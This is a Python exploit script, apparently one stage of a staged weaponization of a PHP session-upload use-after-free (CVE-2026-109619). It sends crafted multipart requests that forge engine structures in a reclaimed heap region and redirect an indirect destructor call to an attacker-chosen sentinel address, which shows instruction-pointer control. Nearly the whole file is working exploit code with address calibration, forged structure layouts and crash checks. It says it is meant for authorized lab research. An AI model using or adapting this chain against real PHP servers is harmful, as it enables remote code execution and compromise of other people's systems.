#!/usr/bin/env python3
"""
CVE-2026-109619 weaponization — Rung 5a: controlled indirect call
(instruction-pointer control) via a forged object's destruction.

Prerequisites (rungs 1-4, reproduced by verify_109619_reclaim.py /
_weaponized_read.py / _weaponized_write.py): the consumer's multipart
marker overlays the freed php_unserialize_data; forged bookkeeping is
honored; R:n references return attacker-forged zvals; the negative-
used_slots dtor slots steer decoded-value storage.

Rung 5a mechanism (Zend/zend_objects_API.c, zend_objects_store_del):

    if (!(OBJ_FLAGS(object) & IS_OBJ_DESTRUCTOR_CALLED)) {
        GC_ADD_FLAGS(object, IS_OBJ_DESTRUCTOR_CALLED);
        if (object->handlers->dtor_obj != zend_objects_destroy_object
                || object->ce->destructor) {
            GC_SET_REFCOUNT(object, 1);
            object->handlers->dtor_obj(object);      <- INDIRECT CALL:
                                                         target read from
                                                         the FORGED
                                                         handlers table;
                                                         r0 = the forged
                                                         object pointer
        }
    }

Chain:
  A1  session P (producer's 6 MB OOM crossing allocation) and session C
      (filename "x|R:1;" — the php-handler mismatch decode parses R:1;).
  A2  producer: OOM mid-decode -> BG(unserialize).data dangles (INIT log
      gives d live; marker base = d - 0x6000).
  B   consumer multipart whose marker forges:
        - php_unserialize_data (as in rung 4)
        - a fake zend_object: gc.refcount tuned so the session destroy
          brings it to 0; gc.type_info = IS_OBJECT; handlers -> fake
          table (ce is never read: the dtor_obj comparison
          short-circuits)
        - a fake zend_object_handlers table: dtor_obj = SENTINEL
          (0x4141414141414141)
        - entries.data[0] -> a forged IS_OBJECT zval pointing at the
          fake object
      The R:1; reference returns that zval; the decode failure cleanup
      (php_session_destroy -> zend_hash_clean of $_SESSION) drops the
      last reference -> rc_dtor_func -> zend_objects_store_del ->
      dtor_obj(object) = the SENTINEL.

Expected evidence:
  RVAL ... type=8 lval=<fake object address>     (the forged object zval)
  OBJDEL obj=<fake object> rc=0 handlers=<fake table>
         dtor_obj=0x4141414141414141            (the call target — ours)
  then SIGSEGV (the indirect call to the sentinel), FPM child exit,
  nginx 502 — an attacker-chosen pointer reached the instruction
  pointer through fully attacker-forged engine state.

For authorized research against your own lab only. The final proof in
this repo remains a fixed benign command; no arbitrary-target or
arbitrary-command packaging.
"""
import argparse
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "RECLAIM"
SID_P = "abcdef0123456789abcdef0123456789"
SID_C = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
MAP_OFF = 0x6000            # marker offset mapping onto d+0 (calibrated)
MARKER_LEN = 128 * 1024

# forged-structure offsets within the marker (pages that empirically
# survive the consumer request's allocations)
FAKE_ENTRIES_OFF = 0x8000   # var_entries for `last` / backrefs
FAKE_DTOR_OFF = 0x8400      # var_dtor_entries (negative used_slots)
FAKE_OBJECT_OFF = 0x8500    # forged zend_object
FAKE_HANDLERS_OFF = 0x8600  # forged zend_object_handlers table
FAKE_ZVAL_OFF = 0x8700      # forged IS_OBJECT zval returned by R:1
TMP_SLOT_OFF = 0x7000       # where the negative dtor slot lands (scratch)

IS_OBJECT = 8
SENTINEL = 0x4141414141414141

# the r: (weak reference) rule requires the target to be IS_OBJECT and
# does a plain ZVAL_COPY (+GC_ADDREF on our fake object) — no reference
# wrapping (the R: rule wraps via ZVAL_NEW_REF and the session
# normalize step then leaks the reference refcount, so the object is
# never destroyed). r: keeps the accounting clean: refcount 0 ->
# r:+1 -> bucket ownership -> array-destroy delref -> 0 -> destruction.
PAYLOAD = "x|r:1;"


def http_req(host, port, raw, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def build_multipart(sid, progress, marker, filename, target_path):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="m"\r\n\r\n'
    ).encode("latin-1") + marker + (
        f"\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def uafdbg(container, since=60):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{since}s", container],
                           capture_output=True, text=True, timeout=30)
        blob = r.stdout + r.stderr
    except Exception:
        return []
    out = []
    for line in blob.splitlines():
        m = re.search(r"\[UAFDBG\] (.*)", line)
        if m:
            out.append(m.group(1).rstrip('"'))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18085")
    ap.add_argument("--container", default="php2shell-zendmm-fpm")
    ap.add_argument("--map-off", type=lambda x: int(x, 0), default=MAP_OFF)
    ap.add_argument("--fake-refcount", type=lambda x: int(x, 0),
                    default=0,
                    help="initial gc.refcount of the fake object (tune so "
                         "the session destroy's DELREF reaches 0)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80
    cont = args.container

    print("[*] CVE-2026-109619 weaponization — rung 5a: controlled")
    print("    indirect call via forged-object destruction")
    print(f"[*] Target: {args.target}   marker->d map offset: {hex(args.map_off)}")
    print()

    # --- A1: build sessions P and C --------------------------------------
    print(f"[A1] Building session P (6 MB key) and session C (payload {PAYLOAD!r})")
    http_req(host, port, build_multipart(SID_P, "A" * (6 * 1024 * 1024),
                                         b"", "x|i:1;", "/app/upload.php"))
    http_req(host, port, build_multipart(SID_C, "c", b"", PAYLOAD,
                                         "/app/upload.php"))
    print("     done")
    print()

    # --- A2: producer -------------------------------------------------------
    print("[A2] Producer: memory-pressure session_start() with session P")
    req = (
        f"GET /api/producer.php HTTP/1.1\r\nHost: x\r\n"
        f"Cookie: PHPSESSID={SID_P}\r\nConnection: close\r\n\r\n"
    ).encode()
    resp = http_req(host, port, req, timeout=90)
    print(f"     producer fatal: {b'Allowed memory' in resp}")
    time.sleep(0.4)
    d_addr = None
    for l in uafdbg(cont, 20):
        if "INIT" in l and "level=1" in l:
            d_addr = int(l.split("d=")[1].split()[0], 16)
    if not d_addr:
        print("     [!] producer d not found — aborting")
        sys.exit(1)
    base = d_addr - args.map_off
    print(f"     producer d = {hex(d_addr)}; marker base = {hex(base)}")
    print()

    # --- forge the marker ----------------------------------------------------
    marker = bytearray(b"".join(struct.pack("<Q", i * 8)
                                for i in range(MARKER_LEN // 8)))

    def q(off, val):
        marker[off:off + 8] = struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    def put(off, data):
        marker[off:off + len(data)] = data

    fake_obj = base + FAKE_OBJECT_OFF
    fake_ht = base + FAKE_HANDLERS_OFF
    fake_zval = base + FAKE_ZVAL_OFF

    # forged php_unserialize_data at d+0
    q(args.map_off + 0, base + FAKE_ENTRIES_OFF)      # last
    q(args.map_off + 8, base + FAKE_DTOR_OFF)         # first_dtor
    q(args.map_off + 16, base + FAKE_DTOR_OFF)        # last_dtor
    q(args.map_off + 24, 0)                           # allowed_classes
    q(args.map_off + 32, 0)                           # ref_props
    q(args.map_off + 40, 0)                           # cur_depth
    q(args.map_off + 48, 0)                           # max_depth
    q(args.map_off + 56, 2)                           # entries.used_slots
    q(args.map_off + 64, 0)                           # entries.next
    q(args.map_off + 72, fake_zval)                   # entries.data[0]
    q(args.map_off + 80, fake_zval)                  # entries.data[1]

    # fake var_entries (last): used_slots=1 -> tmp slots from data[1]
    q(FAKE_ENTRIES_OFF + 0, 1)
    q(FAKE_ENTRIES_OFF + 8, 0)
    for i in range(4):
        q(FAKE_ENTRIES_OFF + 16 + 8 * i, base + FAKE_ENTRIES_OFF + 0x100)

    # fake var_dtor_entries: negative used_slots -> first tmp/current slot
    # lands at TMP_SLOT_OFF (scratch)
    used_slots = (TMP_SLOT_OFF - FAKE_DTOR_OFF - 16) // 16
    assert (TMP_SLOT_OFF - FAKE_DTOR_OFF - 16) % 16 == 0 and used_slots < 0
    q(FAKE_DTOR_OFF + 0, used_slots)
    q(FAKE_DTOR_OFF + 8, 0)

    # forged zend_object: gc{refcount, type_info}, handle, pad, ce,
    # handlers, properties — ce is never read (dtor_obj comparison
    # short-circuits); handle only matters after the crash.
    put(FAKE_OBJECT_OFF + 0,
        struct.pack("<II", args.fake_refcount & 0xFFFFFFFF,
                    IS_OBJECT))               # gc: refcount, type_info
    put(FAKE_OBJECT_OFF + 8, struct.pack("<I", 0))  # handle (+4 pad)
    q(FAKE_OBJECT_OFF + 16, 0)                       # ce (unused)
    q(FAKE_OBJECT_OFF + 24, fake_ht)                 # handlers -> ours
    q(FAKE_OBJECT_OFF + 32, 0)                        # properties

    # forged zend_object_handlers: offset(4)+pad, free_obj(+8), dtor_obj(+16)
    put(FAKE_HANDLERS_OFF + 0, struct.pack("<i", 0))  # offset (obj base)
    q(FAKE_HANDLERS_OFF + 8, 0)                        # free_obj
    q(FAKE_HANDLERS_OFF + 16, SENTINEL)                # dtor_obj <- TARGET

    # forged IS_OBJECT zval returned by R:1
    put(FAKE_ZVAL_OFF + 0, struct.pack("<QQLL",
                                       fake_obj,
                                       IS_OBJECT | (1 << 8),  # IS_OBJECT|refcounted
                                       0, 0))

    print("[*] Forged structures:")
    print(f"     fake object     @ {hex(fake_obj)}  (refcount={args.fake_refcount & 0xFFFFFFFF:#x},")
    print(f"                        type_info=IS_OBJECT, handlers -> ours)")
    print(f"     fake handlers   @ {hex(fake_ht)}  (dtor_obj = {hex(SENTINEL)})")
    print(f"     forged zval     @ {hex(fake_zval)}  (IS_OBJECT|refcounted -> {hex(fake_obj)})")
    print(f"     R:1 returns the forged zval; the session destroy walks it:")
    print(f"     zend_objects_store_del -> handlers->dtor_obj = {hex(SENTINEL)}")
    print()

    # --- B: consumer ---------------------------------------------------------
    print("[B] Consumer: multipart with the forged marker (api/ dir)")
    mark = len(uafdbg(cont, 20))
    req = build_multipart(SID_C, "c", bytes(marker), "consumer.bin",
                          "/api/endpoint.php")
    resp = http_req(host, port, req, timeout=120)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response / child crashed>"
    print(f"     {status}")
    time.sleep(0.6)
    print("=== consumer trace ===")
    lines = uafdbg(cont, 30)[mark:]
    for l in lines:
        print(f"     {l}")
    print()

    # --- verdict ---------------------------------------------------------
    saw_obj, saw_sentinel, saw_crash = False, False, "no"
    for l in lines:
        if "OBJDEL" in l and hex(fake_obj)[2:] in l.replace("0x", ""):
            saw_obj = True
            if hex(SENTINEL)[2:] in l.replace("0x", ""):
                saw_sentinel = True
    if "crashed" in status or resp == b"":
        saw_crash = "yes (no response)"
    elif b"502" in resp:
        saw_crash = "yes (502 Bad Gateway)"
    print("[*] Verdict:")
    print(f"     forged object reached destruction: {saw_obj}")
    print(f"     dtor_obj == sentinel in the log:    {saw_sentinel}")
    print(f"     worker crashed after the call:      {saw_crash}")
    if saw_obj and saw_sentinel:
        print()
        print("[EVIDENCE] RUNG 5a REPRODUCED — instruction-pointer control:")
        print("    the engine called through an attacker-forged handlers")
        print("    table: dtor_obj = 0x4141414141414141, reached via the")
        print("    stale-state weaponization chain (reclaim -> forged")
        print("    bookkeeping -> R: object injection -> destruction call).")
        print("    Every byte of the called-through state originated in")
        print("    the consumer's multipart marker field.")
    elif saw_obj:
        print("    The destruction was reached but the handlers print")
        print("    needs checking against the trace above.")
    else:
        print("    Destruction not reached — tune --fake-refcount (the")
        print("    initial gc.refcount must make the session destroy's")
        print("    DELREF reach 0; try 0, 1, or 0xFFFFFFFF-1).")


if __name__ == "__main__":
    main()
